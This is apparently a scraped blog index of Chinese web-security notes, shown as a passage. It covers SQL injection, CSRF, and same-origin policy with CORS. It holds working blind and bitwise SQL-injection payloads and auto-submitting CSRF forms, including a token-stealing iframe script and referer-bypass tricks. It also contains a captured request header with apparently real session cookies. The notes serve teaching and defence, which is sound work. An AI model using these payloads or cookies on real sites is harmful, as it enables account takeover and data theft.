在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。 总结 1231、使用PDO时尽量使用非模拟预处理。2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。3、SQL语句模板不使用变量动态拼接生成 关于orderby不能参数化查询的问题 原因： order by后面拼接字段名，字段名不能加引号。 在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。 insert、update注入利用报错注入12insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句 or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- 无回显注入(盲注) 利用xor、||、&amp;&amp;、+,-,*,/ 1234567mysql&gt; select (sleep(10));+-------------+| (sleep(10)) |+-------------+| 0 |+-------------+1 row in set (10.00 sec) 实例： 1234567891011121314151617mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.03 sec)mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.02 sec)mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.03 sec)mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.02 sec)mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.09 sec)mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.01 sec) 配合if、substr等函数进行盲注。 12345mysql&gt; insert into math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);Query OK, 1 row affected (10.00 sec) 有回显注入(符号) 实例： 按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。 这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#int型按位或mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected, 1 warning (0.03 sec)mysql&gt; select * from steady;+----------+----------+-----------+------+| userid | username | signature | mood |+----------+----------+-----------+------+| 74657374 | 0 | test | 0 |+----------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(74657374);+-----------------+| unhex(74657374) |+-----------------+| test |+-----------------+1 row in set (0.00 sec)#int型按位异或mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected, 1 warning (0.03 sec)mysql&gt; select * from ctf;+----------+----------+-----------+------+| userid | username | signature | mood |+----------+----------+-----------+------+| 74657338 | 0 | test | 0 |+----------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(100^74657338);+---------------------+| unhex(100^74657338) |+---------------------+| test |+---------------------+1 row in set (0.00 sec)#字符型按位或mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.02 sec)mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 74657374 | test | 0 |+--------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(74657374);+-----------------+| unhex(74657374) |+-----------------+| test |+-----------------+1 row in set (0.00 sec)#字符型按位异或mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.03 sec)mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 74657338 | test | 0 |+--------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(&#39;100&#39;^74657338);+-----------------------+| unhex(&#39;100&#39;^74657338) |+-----------------------+| test |+-----------------------+1 row in set (0.00 sec) mysql运算符 按位或运算符–｜ 0与任意的数字b或都为b 1234567891011121314151617181920212223mysql&gt; mysql&gt; select (0|1);+-------+| (0|1) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select (0|2323);+----------+| (0|2323) |+----------+| 2323 |+----------+1 row in set (0.01 sec)mysql&gt; select (0|452323);+------------+| (0|452323) |+------------+| 452323 |+------------+1 row in set (0.00 sec) 按位异或运算符–^ 0与任意的数字b异或都是b 12345678910111213141516mysql&gt; select (0^452323);+------------+| (0^452323) |+------------+| 452323 |+------------+1 row in set (0.00 sec)mysql&gt; select (0^5644);+----------+| (0^5644) |+----------+| 5644 |+----------+1 row in set (0.00 sec) 其他数字a与任意数字b异或得到c 可以通过c与a异或得到b，通常b是我们sql注入想要的数据库 123456789101112131415mysql&gt; select (10^5644);+-----------+| (10^5644) |+-----------+| 5638 |+-----------+1 row in set (0.00 sec)mysql&gt; select (10^5638);+-----------+| (10^5638) |+-----------+| 5644 |+-----------+1 row in set (0.00 sec) 补充1、mysql的网站注入，5.0以上和5.0以下有什么区别？ MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。 5.0以下是多用户单操作，5.0以上是多用户多操做。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://s1eady.top/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"CSRF漏洞","slug":"CSRF漏洞总结","date":"2019-06-22T01:20:56.000Z","updated":"2020-10-07T02:21:00.314Z","comments":true,"path":"2019/06/22/CSRF漏洞总结/","link":"","permalink":"http://s1eady.top/2019/06/22/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"CSRF漏洞总结Gmail的CSRF漏洞黑客诱惑受害者点击藏有恶意代码的空白页面 12345678910&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot;/&gt; ..... &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit();&lt;/script&gt; 这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了”Create Filter”命令，将所有的邮件，转发到”&#x68;&#97;&#99;&#107;&#x65;&#x72;&#x40;&#x68;&#97;&#x6b;&#x65;&#x72;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;“。 漏洞原理攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 受害者登录a.com，并保留了登录凭证（Cookie）。 攻击者引诱受害者访问了b.com。 b.com伪装受害者的身份向c.com 发送了一个请求。 c.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让c.com执行了自己定义的操作。 漏洞类型GET类型的CSRF只需要一个HTTP请求： 1&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;bank.example&#x2F;withdraw?amount&#x3D;10000&amp;for&#x3D;hacker&quot; &gt; 在受害者访问含有这个img的页面后，浏览器会自动向http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。 POST类型的CSRF使用的是一个自动提交的表单 123456 &lt;form action=&quot;http://bank.example/withdraw&quot; method=POST&gt; &lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;xiaoming&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;hacker&quot; /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。以上两个类型不需要用户去操作，会在用户不知情的情况下自动提交请求。 链接类型的CSRF此类CSRF需要用户交互，必须用户有意识到去点击恶意连接。 1&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;csrf&#x2F;withdraw.php?amount&#x3D;1000&amp;for&#x3D;hacker&quot; taget&#x3D;&quot;_blank&quot;&gt;领取200红包&lt;a&#x2F;&gt; 漏洞特点 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 利用思路1、无需任何验证即可删除某社区的帖子 1http://zone.wooyun.org/index.php?do=edit&amp;act=delcomment&amp;fun=ajax&amp;id=311946 2、用户在快速登录(qq、微信)之后,网站要求重新填写用户名、密码、邮箱等信息 3、网站个人后台修改密码时候无验证码、旧密码、表单token认证等操作 4、敏感操作: 刷粉丝、花钱购买图书章节阅读权限、恶意打赏、恶意刷评论 利用payload1、get型–构造url 2、post型–burp可以直接生成poc 3、结合存储型xss,存放我们的csrfpoc 绕过思路1、Token绕过页面表单会生成一个token,执行操作的时候需要带上token 结合xss–将我们构造好的代码插入目标网站,获取用户当前的cookie、token等信息,发送到我们的网站 attach()函数用于获取user_token 一个iframe标签用于隐藏访问获取一个Token 一个form表单用于将修改的密码与Token进行提交数据库 12345678910111213141516&lt;script type=&quot;text/javascript&quot;&gt;function attack()&#123; document.getElementsByName(&#x27;user_token&#x27;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#x27;user_token&#x27;)[0].value; document.getElementById(&quot;transfer&quot;).submit();&#125;&lt;/script&gt;&lt;iframe src=&quot;http://192.168.0.1/xxx&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt;&lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.109/xxx&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;&lt;/form&gt;&lt;/body&gt; token在url中可见+请求包的referer字段 让用户访问我们自己的网站,从用户的请求包中的referer字段拿到用户的token 使用JSONP跨域去请求Token 前提 请求是不检查Referer 使用JSONP去跨域生成Token 回传参数可以得出，默认为callback 能够fuzz出一定回调参数的值 利用:构造callback的值,发送JSONP请求,获取Token,进行表单构造利用,引诱点击 ▲ Token的值也可能与其他参数有关 2、referer绕过根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求 目标站判断了referer是否正确,但是对无referer的情况没有作出判断,逻辑上出现错误 csrfpoc使用html代码 &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; 比如 12345678910111213&lt;html&gt; &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt; &lt;form action=&quot;http://www.baidu.com/setProfile&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;new22&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;1&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;team&quot; value=&quot;new22&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;address&quot; value=&quot;new33&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 用户可以设置浏览器不传递referer 使用协议绕过 利用ftp://,http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。 利用data:协议 1234567&lt;html&gt;&lt;body&gt;&lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/body&gt;&lt;/html&gt;payload:&lt;form method=post action=http://a.b.com/d&gt;&lt;input type=text name=&#x27;id&#x27; value=&#x27;123&#x27;/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt; 利用https协议 https向http跳转的时候Referer为空 payload在https环境下 1&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx.xxxxx&#x2F;attack.php&quot;&gt; attack.php写上CSRF攻击代码 Referrer Policy 隐藏referrer 1&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;steady.com&quot; referrerpolicy&#x3D;&quot;no-referrer&quot;&gt; IE6、7下使用window.location.href=url、window.open进行界面的跳转，会丢失Referer。 绕过后台逻辑判断 可以在我们的恶意url中添加上后台指定的url(把对方指定的url名字变成我们的文件夹名字) 3、jsonp跨域劫持通过发起jsonp请求，拿到服务端发回的token 防御思路1、验证码优点： 验证码类型日新月异,各种技术层出不穷。可以很好的防止CSRF 缺点： 无法大量部署。影响用户体验。不能每一步都加上验证码。 2、二次验证检查请求来源 优点: 检查请求来源的主要方式为 Referer、Origin，就是 HTTP 请求头的那个（两者比较类似，下面仅以 Referer 为例）。Referer 最常见的应用实际上是防盗链。比如我的博客就有。防盗链利用了 referer 检查请求的来源，同样也可以利用来防御 CSRF。 缺点: 用户为了保护隐私，自己阻止了浏览器发送 referer 攻击者可以让自己的页面不发送 referer：这个代码告诉浏览器，所有从当前页面中发起的请求都不要携带 referer HTTPS 转为 HTTP 的时候，浏览器出于安全的考虑，不发送 referer。例如网站中有，如果当前页面使用的是 HTTPS，而正要加载的资源使用的是 HTTP，则将 HTTP header 中的 referer 置空。但是如果是 content=”always” 的话，浏览器会把 HTTPS 的 referer 带给 HTTP 的页面 如果添加referer并且目标页面token是get形式发送(在url中可见),我们伪造一个页面让别人从目标站来访问我们自己的页面,在请求头中的referer能够带上token,导致token泄漏 3、Token那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。 CSRF Token的防护策略分为三个步骤： 1.将CSRF Token输出到页面中 Token不能放在cookie中，容易被获取，最好放在服务端到session中。之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。 2.页面提交的请求携带这个Token 对于GET请求，Token将附在请求地址之后。 对于 POST 请求来说，要在 form 的最后加上。 1&lt;input type&#x3D;”hidden” name&#x3D;”csrftoken” value&#x3D;”tokenvalue”&#x2F;&gt; 3.服务器验证Token是否正确 Token的分布式校验 Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。为此解决办法是Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。 4、同源检测服务器可以通过解析这两个Header–Origin Header、Referer Header中的域名，确定请求的来源域。 注意： IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。 302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。 Referer：对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。 如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。 5、双重cookie双重Cookie采用以下流程： 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 6、Samesite Cookie属性Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax。 Samesite=Strict 严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。 淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。 123Set-Cookie: foo&#x3D;1; Samesite&#x3D;StrictSet-Cookie: bar&#x3D;2; Samesite&#x3D;LaxSet-Cookie: baz&#x3D;3 在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。 Samesite=Lax 宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。 123Set-Cookie: foo&#x3D;1; Samesite&#x3D;StrictSet-Cookie: bar&#x3D;2; Samesite&#x3D;LaxSet-Cookie: baz&#x3D;3 当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。 该设置有个缺点，topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"同源策略与CSP","slug":"同源策略与CSP","date":"2019-06-22T01:20:56.000Z","updated":"2020-10-07T02:20:41.311Z","comments":true,"path":"2019/06/22/同源策略与CSP/","link":"","permalink":"http://s1eady.top/2019/06/22/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/","excerpt":"","text":"同源策略什么是跨域?域:域是windows网络操作系统的逻辑组织单元,也是internet的逻辑组织单元.他是安全边界 只有域的所有者才能有权利去管理或者访问域内部的资源,若其他域要访问或者管理,则需要该域赋予其他域的相关权限。 网页跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。 同源策略同源是指域名、协议、端口相同 浏览器的同源策略主要有两个: DOM的同源策略:禁止对不同源页面的DOM元素进行操作,主要是在inframe标签加载跨域页面出现 XmlHttpRequests同源策略:禁止XHR对象对不同的源地址发起请求 存储在浏览器中的数据，如localStroage、Cooke和IndexedDB不能通过脚本跨域访问 Dom 同源策略Dom同源策略主要是防止你通过iframe标签引入恶意的网页,该网页能够窃取当前网站的cookie等重要信息,之所以是Dom同源策略,就是我们可以操作Dom来拿到重要信息,比如操作Dom元素拿到目标网站中的input标签中的内容，内容可能是密码、账号。 我们来看一个例子: 12345678 &lt;head&gt; &lt;title&gt;Siam - Dom同源策略&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.alipay.com&quot;&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现，他拒绝了支付宝页面的展示,原因是没有设置请求头---X-Frame-Options,主要原因就是不同源(sameorigin) X-Frame-Options 是一个HTTP标头（header），用来告诉浏览器这个网页是否可以放在iFrame内。 123X-Frame-Options: DENY &#x2F;&#x2F; 不允许iframeX-Frame-Options: SAMEORIGIN &#x2F;&#x2F; 只允许同源的网站iframeX-Frame-Options: ALLOW-FROM [http:&#x2F;&#x2F;yancoo.cn&#x2F;](https:&#x2F;&#x2F;links.jianshu.com&#x2F;go?to&#x3D;http%3A%2F%2Fyancoo.cn%2F) &#x2F;&#x2F; 只允许指定网站iframe XMLHttpRequest 同源策略XHR主要是防止获取用户cookie,防止攻击者进行跨站请求伪造 跨站请求原理: 1、用户登陆网站A,先要填写用户名、密码等cookie信息.然后信息保存在浏览器中 2、用户访问恶意网站B,(不知情的情况下)执行恶意网站的某些操作,而该操作会带上用户在浏览器端的cookie信息 去执行一些非法操作 3、站点A根据请求所带的cookie,判断该用户为合法的A用户,成功实现攻击者的目的 同源检测Origin Header具体流程 当一个链接或者XMLHttpRequest去请求跨域操作，浏览器事实上的确向目标服务器发起了连接请求，并且携带这origin。 请求首部字段 Origin 指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息。除了不包含路径信息（不包含path及query），该字段与 Referer 首部字段相似。 Referer Header具体流程 在发起请求前，调用window.localtion获取window.location.href获取当前地址栏中的请求地址 将该地址附加到referrer域中 判断请求头中的Referer字段，比如： 12345678910GET /pheapi/article/dir/89489609 HTTP/1.1Host: blog.csdn.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://blog.csdn.net/qq_36119192/article/details/89489609X-Requested-With: XMLHttpRequestX-Tingyun-Id: im-pGljNfnc;r=901833252Connection: close 以上场景出现在用户从https://blog.csdn.net/qq_36119192/article/details/89489609访问/pheapi/article/dir/89489609，目的页面可以通过请求头中的referer字段来判断是否是跨域请求。 两者区别origin只有发生跨域请求或者同域的post请求时候才会有。 referer不论何种情况下，只要浏览器能获取到请求源都会携带，携带着url的很多参数信息，而这些信息实际上是隐私的，但是外部网站都可以看到这些数据。 补天平台登录请求头 12345678910111213POST /user/sign-in?next=https://www.butian.net/Home/login/loginBack HTTP/1.1Host: user.butian.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: application/jsonAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/json; charset=UTF-8Content-Length: 208//可以看到referer没有带上path和queryOrigin: https://user.butian.netConnection: closeReferer: https://user.butian.net/user/sign-in?next=https://www.butian.net/login.html&amp;style=1Cookie: next=&quot;https%3A//www.butian.net/login.html&quot;; __q__=1601903202954; csrf_token=1601906836##158ab5b128d3781965424a7ece2f6cbe318bcf8f; style=1; User-Center=b8a5b564-f158-4af1-977d-6adf7105c2c9; btlc_ba52447ea424004a7da412b344e5e41a=e063dd212b16f71c690e97fa9aeaafc404be29448327bf57a72e50f675893d27 跨域的解决方法CORS 跨域解决它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。CORS的请求操作由浏览器自动执行,关键就是服务端的配置,来检测是否允许客户端进行访问。 CORS的原理: 使用http自定义头,请求头带上客户端的信息,服务端进行验证,返回响应信息告诉客户端目标资源是否允许被访问 两种请求简单请求必须同时满足以下两个条件的请求，才是简单请求 请求方法只能是在以下三种之中： 123GETPOSTHEAD HTTP的头信息不超出以下几种字段： 12345AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type 只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain 凡是不同时满足上面两个条件，就属于非简单请求。 非简单请求在发送真正请求之前，会先发送一次预检请求，来判断服务端是否支持非简单请求的类方法。预检通过之后，浏览器会再次使用真实请求方法发起请求 “预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。 除了Origin字段，”预检”请求的头信息包括两个特殊字段。 Access-Control-Request-Method 该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 三个与CORS请求相关的字段1234Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 Access-Control-Allow-Origin该字段是必须的，它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 Access-Control-Allow-Credentials该字段可选，它的值是一个布尔值，表示是否允许发送Cookie。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。 Access-Control-Expose-Headers该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&#39;FooBar&#39;)可以返回FooBar字段的值。 实践简单请求两个网站—www.siam.com和www.siam2.com sim向sim2发起请求 sim网站如下,使用ajax请求sim2: 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;首页1&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;这是原始页面的内容&lt;/h1&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(function()&#123; $.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125; &#125;) &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; sim2: 12&lt;?phpecho &quot;来自index2.php的内容&quot;; 访问sim2的时候: 1(index):1 Access to XMLHttpRequest at ‘[http://www.siam2.com/index2.php](http://www.siam2.com/index2.php)‘ from origin ‘[http://siam.com](http://siam.com/)‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. 很明显不允许进行跨域 因为我们的服务端–sim2没有进行相应的设置,接下来我们进行一下相应的设置: 响应头中增加字段，来添加信任站点的域名 123&lt;?phpheader(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);echo &quot;来自index2.php的内容&quot;; 这里就跨域请求成功了。 非简单请求因为简单请求必须是HEAD，GET，POST其一，所以我们这里直接使用PUT方法来测试就可以出现非简单请求的场景了。 当然你也可以自定义HTTP头部来实现非简单请求。 我们把index.html的ajax方法改为put 然后请求 1234567$.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125;&#125;) 